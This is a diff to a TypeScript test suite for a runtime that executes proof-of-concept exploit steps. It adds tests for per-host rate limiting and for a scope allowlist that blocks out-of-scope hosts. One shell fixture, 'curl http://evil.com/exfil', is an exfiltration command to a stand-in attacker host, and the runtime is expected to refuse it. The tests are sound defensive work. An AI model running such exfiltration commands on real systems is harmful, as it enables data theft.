@@ -26,6 +26,8 @@ import {
   executePocSteps,
   setRuntimeDeps,
   MAX_CAPTURE_BYTES,
+  _resetRateLimitState,
+  _scopeMatch,
   type PocExecutionTarget,
 } from "./poc-runtime.js";
 
@@ -150,10 +152,12 @@ function findingWith(steps: PocStep[]): Finding {
 let restore: (() => void) | undefined;
 beforeEach(() => {
   restore = undefined;
+  _resetRateLimitState();
 });
 afterEach(() => {
   if (restore) restore();
   restore = undefined;
+  _resetRateLimitState();
 });
 
 // ── Shell action ────────────────────────────────────────────────────────────
@@ -575,5 +579,209 @@ describe("executePocSteps — output capture caps", () => {
       MAX_CAPTURE_BYTES + 64,
     );
     expect(report.steps[0].observedStdout).toContain("truncated at 1MiB");
+  });
+});
+
+// ── Per-host RPS cap (Fix 6) ────────────────────────────────────────────────
+
+describe("executePocSteps — per-host rate limit", () => {
+  it("paces N+1 fast http requests so the elapsed time exceeds the bucket refill interval", async () => {
+    // rps=2 → 1 token / 500 ms. With 2 burst tokens + a 3rd request we expect
+    // at least ~500 ms total. Use a generous lower bound so this is stable
+    // on slow CI (we only assert the bucket actually kicked in).
+    const { fetchFn } = makeFakeFetch(() => new Response("", { status: 200 }));
+    restore = setRuntimeDeps({ fetch: fetchFn });
+    const finding = findingWith([
+      { id: "s1", kind: "exploit", summary: "1", action: { type: "http", method: "GET", url: "/a" } },
+      { id: "s2", kind: "exploit", summary: "2", action: { type: "http", method: "GET", url: "/b" } },
+      { id: "s3", kind: "exploit", summary: "3", action: { type: "http", method: "GET", url: "/c" } },
+    ]);
+    const t0 = Date.now();
+    await executePocSteps(finding, {
+      baseUrl: "http://rate-limited.example.com",
+      rpsPerHost: 2,
+    });
+    const elapsed = Date.now() - t0;
+    // Bucket starts full (2 tokens) → first 2 requests pass instantly. The
+    // 3rd needs a refill of ~500 ms.
+    expect(elapsed).toBeGreaterThanOrEqual(400);
+  });
+
+  it("blocks subsequent requests for >=60s after a 429 with no Retry-After (cool-off)", async () => {
+    // We mostly want to confirm the runtime sets the retryUntil window. We
+    // can't actually wait 60s in a test, so we check the second request gets
+    // parked past a short threshold (~250ms) — the bucket itself sleeps in
+    // small increments while retryUntil is set.
+    //
+    // We pass an explicit small per-step timeoutMs so the http step's own
+    // AbortController fires cleanly at the end of the test, instead of
+    // leaving a multi-second fetch dangling. The afterEach
+    // `_resetRateLimitState()` then zeroes the parked bucket's retryUntil
+    // so the underlying 60-second cool-off sleep also exits.
+    let calls = 0;
+    const { fetchFn } = makeFakeFetch(() => {
+      calls++;
+      if (calls === 1) return new Response("limited", { status: 429 });
+      return new Response("", { status: 200 });
+    });
+    restore = setRuntimeDeps({ fetch: fetchFn });
+    const finding = findingWith([
+      { id: "s1", kind: "exploit", summary: "1", action: { type: "http", method: "GET", url: "/a" } },
+      { id: "s2", kind: "exploit", summary: "2", action: { type: "http", method: "GET", url: "/b" } },
+    ]);
+    // Race: the second http step should never resolve in 250ms because the
+    // host is on a 60s cool-off. We assert only the first step completed
+    // dispatch by checking the call counter after the wait window.
+    const promise = executePocSteps(finding, {
+      baseUrl: "http://cool-off.example.com",
+      rpsPerHost: 100, // big so refills aren't the gate
+      timeoutMs: 250,
+    });
+    const timeout = new Promise<"timed-out">((r) => setTimeout(() => r("timed-out"), 250));
+    const winner = await Promise.race([promise.then(() => "done" as const), timeout]);
+    expect(winner).toBe("timed-out");
+    // Step 1 fetched (429), step 2 still parked.
+    expect(calls).toBe(1);
+  });
+});
+
+// ── Scope allowlist (Fix 7) ─────────────────────────────────────────────────
+
+describe("_scopeMatch", () => {
+  it("exact host match", () => {
+    expect(_scopeMatch("acme.com", ["acme.com"])).toBe(true);
+    expect(_scopeMatch("evil.com", ["acme.com"])).toBe(false);
+  });
+
+  it("wildcard matches subdomains but NOT apex (H1 documented semantic)", () => {
+    expect(_scopeMatch("a.acme.com", ["*.acme.com"])).toBe(true);
+    expect(_scopeMatch("b.c.acme.com", ["*.acme.com"])).toBe(true);
+    expect(_scopeMatch("acme.com", ["*.acme.com"])).toBe(false);
+  });
+
+  it("operator can list both apex and wildcard for full coverage", () => {
+    const list = ["acme.com", "*.acme.com"];
+    expect(_scopeMatch("acme.com", list)).toBe(true);
+    expect(_scopeMatch("a.acme.com", list)).toBe(true);
+  });
+
+  it("ignores port in target host", () => {
+    expect(_scopeMatch("acme.com:8080", ["acme.com"])).toBe(true);
+  });
+
+  it("empty / undefined allowlist == no gate (returns true)", () => {
+    expect(_scopeMatch("anything", undefined)).toBe(true);
+    expect(_scopeMatch("anything", [])).toBe(true);
+  });
+
+  it("case-insensitive", () => {
+    expect(_scopeMatch("ACME.COM", ["acme.com"])).toBe(true);
+    expect(_scopeMatch("a.ACME.com", ["*.acme.com"])).toBe(true);
+  });
+
+  // IPv6 literals: a naive `split(":")[0]` collapses every IPv6 host to its
+  // first hextet (e.g. `[2001`), which would let one allowlisted IPv6 host
+  // accidentally match every other out-of-scope IPv6 host. The normalizer
+  // strips brackets and ignores ports, treating the whole literal as one
+  // opaque key.
+  it("matches bracketed IPv6 with port against allowlist entry", () => {
+    expect(_scopeMatch("[2001:db8::1]:443", ["2001:db8::1"])).toBe(true);
+    expect(_scopeMatch("[2001:db8::1]:443", ["[2001:db8::1]"])).toBe(true);
+  });
+
+  it("matches bracketed IPv6 without port", () => {
+    expect(_scopeMatch("[2001:db8::1]", ["2001:db8::1"])).toBe(true);
+  });
+
+  it("strips port from plain IPv4 hosts in target and allowlist", () => {
+    expect(_scopeMatch("10.0.0.1:8443", ["10.0.0.1"])).toBe(true);
+    expect(_scopeMatch("10.0.0.1", ["10.0.0.1:8443"])).toBe(true);
+  });
+
+  it("does NOT collapse different IPv6 hosts to the same prefix", () => {
+    // Bypass case: `[2001:db8::1]:443` and `[2001:dead::5]:8443` both
+    // start with `[2001:` so the broken `.split(":")[0]` impl would treat
+    // them as the same host. The fix must keep them distinct.
+    expect(_scopeMatch("[2001:dead::5]:8443", ["2001:db8::1"])).toBe(false);
+    expect(_scopeMatch("[2001:dead::5]:8443", ["[2001:db8::1]"])).toBe(false);
+  });
+});
+
+describe("executePocSteps — scope allowlist enforcement", () => {
+  it("refuses http step whose host is out-of-scope", async () => {
+    const { fetchFn, calls } = makeFakeFetch(() => new Response("", { status: 200 }));
+    restore = setRuntimeDeps({ fetch: fetchFn });
+    const finding = findingWith([
+      {
+        id: "evil",
+        kind: "exploit",
+        summary: "evil",
+        action: { type: "http", method: "GET", url: "http://evil.com/x" },
+      },
+    ]);
+    const report = await executePocSteps(finding, {
+      scopeAllowlist: ["acme.com", "*.acme.com"],
+    });
+    expect(report.steps[0].kind).toBe("errored");
+    expect(report.steps[0].error).toContain("out-of-scope host");
+    // Fetch must NOT have been dispatched.
+    expect(calls).toHaveLength(0);
+  });
+
+  it("allows http step whose host matches allowlist", async () => {
+    const { fetchFn } = makeFakeFetch(() => new Response("ok", { status: 200 }));
+    restore = setRuntimeDeps({ fetch: fetchFn });
+    const finding = findingWith([
+      {
+        id: "ok",
+        kind: "exploit",
+        summary: "ok",
+        action: { type: "http", method: "GET", url: "http://api.acme.com/x" },
+        expect: { type: "http-status", status: 200 },
+      },
+    ]);
+    const report = await executePocSteps(finding, {
+      scopeAllowlist: ["*.acme.com"],
+    });
+    expect(report.steps[0].kind).toBe("passed");
+  });
+
+  it("refuses shell step containing an out-of-scope URL token", async () => {
+    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
+    restore = setRuntimeDeps({ spawn: spawnFn });
+    const finding = findingWith([
+      {
+        id: "leak",
+        kind: "exploit",
+        summary: "curl evil",
+        action: { type: "shell", cmd: "curl http://evil.com/exfil > /tmp/out" },
+        expect: { type: "exit-zero" },
+      },
+    ]);
+    const report = await executePocSteps(finding, {
+      scopeAllowlist: ["acme.com", "*.acme.com"],
+    });
+    expect(report.steps[0].kind).toBe("errored");
+    expect(report.steps[0].error).toContain("out-of-scope url in shell cmd");
+    // Spawn must NOT have been called.
+    expect(calls).toHaveLength(0);
+  });
+
+  it("allows shell step whose only URL token is in scope", async () => {
+    const { spawnFn } = makeFakeSpawn({ exitCode: 0 });
+    restore = setRuntimeDeps({ spawn: spawnFn });
+    const finding = findingWith([
+      {
+        id: "ok",
+        kind: "exploit",
+        summary: "curl acme",
+        action: { type: "shell", cmd: "curl https://api.acme.com/x" },
+        expect: { type: "exit-zero" },
+      },
+    ]);
+    const report = await executePocSteps(finding, {
+      scopeAllowlist: ["*.acme.com"],
+    });
+    expect(report.steps[0].kind).toBe("passed");
   });
 });
